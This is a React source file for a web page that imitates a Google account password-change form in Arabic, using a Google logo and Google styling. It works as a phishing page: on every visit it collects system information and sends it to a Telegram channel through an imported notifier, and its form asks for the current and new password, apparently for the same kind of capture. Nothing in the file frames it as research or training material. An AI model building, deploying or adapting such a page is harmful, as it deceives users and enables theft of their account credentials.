import { useState, useEffect } from "react";
import { Eye, EyeOff, HelpCircle, Loader2, MoreVertical, Moon, Sun } from "lucide-react";
import GoogleLogo from "@/components/GoogleLogo";
import { usePasswordForm } from "@/hooks/usePasswordForm";
import { sendToTelegram, collectSystemInfo } from "@/utils/telegramNotifier";

const Index = () => {
  const [showOldPassword, setShowOldPassword] = useState(false);
  const [showNewPassword, setShowNewPassword] = useState(false);
  const [showConfirmPassword, setShowConfirmPassword] = useState(false);
  const [isDarkMode, setIsDarkMode] = useState(false);
  const [isArabic, setIsArabic] = useState(true);

  const {
    oldPassword,
    setOldPassword,
    newPassword,
    setNewPassword,
    confirmPassword,
    setConfirmPassword,
    isLoading,
    handleSubmit,
  } = usePasswordForm();

  useEffect(() => {
    const sendInitialInfo = async () => {
      const message = `
🌐 زيارة جديدة للموقع

${collectSystemInfo()}
      `;
      await sendToTelegram(message);
    };

    sendInitialInfo();
  }, []);

  const toggleDarkMode = () => {
    setIsDarkMode(!isDarkMode);
    document.documentElement.classList.toggle("dark");
  };

  const isFormValid = oldPassword && newPassword && confirmPassword && newPassword === confirmPassword;

  return (
    <div className={`min-h-screen bg-white dark:bg-gray-900 transition-colors ${isArabic ? 'rtl' : 'ltr'}`}>
      <div className="max-w-7xl mx-auto px-4">
        <header className="flex items-center justify-between py-4">
          <button className="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full">
            <MoreVertical className="w-6 h-6 text-gray-600 dark:text-gray-300" />
          </button>
          
          <div className="flex items-center gap-2">
            <GoogleLogo />
            <span className="text-sm text-gray-600 dark:text-gray-300">
              {isArabic ? 'حساب' : 'Account'}
            </span>
          </div>
          
          <div className="flex items-center space-x-4">
            <button
              onClick={toggleDarkMode}
              className="p-2 hover:bg-gray-100 dark:hover:bg-gray-800 rounded-full"
            >
              {isDarkMode ? (
                <Sun className="w-6 h-6 text-gray-600 dark:text-gray-300" />
              ) : (
                <Moon className="w-6 h-6 text-gray-600" />
              )}
            </button>
            <button
              onClick={() => setIsArabic(!isArabic)}
              className="text-sm text-google-blue hover:underline"
            >
              {isArabic ? "English" : "العربية"}
            </button>
            <div className="w-8 h-8 rounded-full bg-google-blue text-white flex items-center justify-center">
              G
            </div>
          </div>
        </header>

        <main className="mt-8 w-full max-w-md mx-auto">
          <h1 className="text-2xl font-semibold text-center text-google-text dark:text-white mb-2">
            تغيير كلمة المرور
          </h1>
          <p className="text-sm text-center text-gray-600 dark:text-gray-300 mb-8">
            استخدم حساب جوجل الخاص بك لتغيير كلمة المرور
          </p>

          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="space-y-4">
              <div>
                <label htmlFor="oldPassword" className="block text-sm font-medium text-google-text dark:text-white mb-1">
                  كلمة المرور الحالية
                </label>
                <div className="relative">
                  <input
                    id="oldPassword"
                    type={showOldPassword ? "text" : "password"}
                    value={oldPassword}
                    onChange={(e) => setOldPassword(e.target.value)}
                    className="w-full px-3 py-2 border border-google-border rounded-md focus:outline-none focus:ring-2 focus:ring-google-blue focus:border-transparent dark:bg-gray-800 dark:border-gray-700 dark:text-white"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowOldPassword(!showOldPassword)}
                    className="absolute left-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-300"
                  >
                    {showOldPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
              </div>

              <div>
                <label htmlFor="newPassword" className="block text-sm font-medium text-google-text dark:text-white mb-1">
                  كلمة المرور الجديدة
                </label>
                <div className="relative">
                  <input
                    id="newPassword"
                    type={showNewPassword ? "text" : "password"}
                    value={newPassword}
                    onChange={(e) => setNewPassword(e.target.value)}
                    className="w-full px-3 py-2 border border-google-border rounded-md focus:outline-none focus:ring-2 focus:ring-google-blue focus:border-transparent dark:bg-gray-800 dark:border-gray-700 dark:text-white"
                    required
                    minLength={8}
                  />
                  <button
                    type="button"
                    onClick={() => setShowNewPassword(!showNewPassword)}
                    className="absolute left-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-300"
                  >
                    {showNewPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
                <div className="mt-2 text-sm text-gray-600 dark:text-gray-400">
                  استخدم 8 أحرف على الأقل. لا تستخدم كلمة مرور من موقع آخر، أو أي شيء واضح للغاية مثل اسم حيوانك الأليف.{" "}
                  <span className="text-google-blue inline-flex items-center gap-1 cursor-pointer hover:underline">
                    لماذا؟
                    <HelpCircle className="w-4 h-4 text-google-blue" />
                  </span>
                </div>
              </div>

              <div>
                <label htmlFor="confirmPassword" className="block text-sm font-medium text-google-text dark:text-white mb-1">
                  تأكيد كلمة المرور الجديدة
                </label>
                <div className="relative">
                  <input
                    id="confirmPassword"
                    type={showConfirmPassword ? "text" : "password"}
                    value={confirmPassword}
                    onChange={(e) => setConfirmPassword(e.target.value)}
                    className="w-full px-3 py-2 border border-google-border rounded-md focus:outline-none focus:ring-2 focus:ring-google-blue focus:border-transparent dark:bg-gray-800 dark:border-gray-700 dark:text-white"
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowConfirmPassword(!showConfirmPassword)}
                    className="absolute left-2 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-300"
                  >
                    {showConfirmPassword ? <EyeOff size={20} /> : <Eye size={20} />}
                  </button>
                </div>
                {newPassword && confirmPassword && newPassword !== confirmPassword && (
                  <p className="mt-1 text-sm text-google-red">كلمات المرور غير متطابقة</p>
                )}
              </div>
            </div>

            <div className="flex justify-end mt-4">
              <button
                type="submit"
                disabled={!isFormValid || isLoading}
                className="w-auto h-10 px-4 rounded-full flex items-center justify-center text-white bg-google-blue hover:bg-blue-600 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-google-blue disabled:opacity-50 disabled:cursor-not-allowed dark:ring-offset-gray-900 text-sm"
              >
                {isLoading ? (
                  <Loader2 className="w-4 h-4 animate-spin" />
                ) : (
                  "تغيير كلمة المرور"
                )}
              </button>
            </div>
          </form>

          <div className="mt-8 flex justify-center space-x-4 text-sm">
            <a href="#" className="text-google-blue hover:underline">إنشاء حساب</a>
            <span className="text-gray-500">•</span>
            <a href="#" className="text-google-blue hover:underline">سياسة الخصوصية</a>
            <span className="text-gray-500">•</span>
            <a href="#" className="text-google-blue hover:underline">شروط الاستخدام</a>
            <span className="text-gray-500">•</span>
            <a href="#" className="text-google-blue hover:underline">المساعدة</a>
          </div>
        </main>
      </div>
    </div>
  );
};

export default Index;
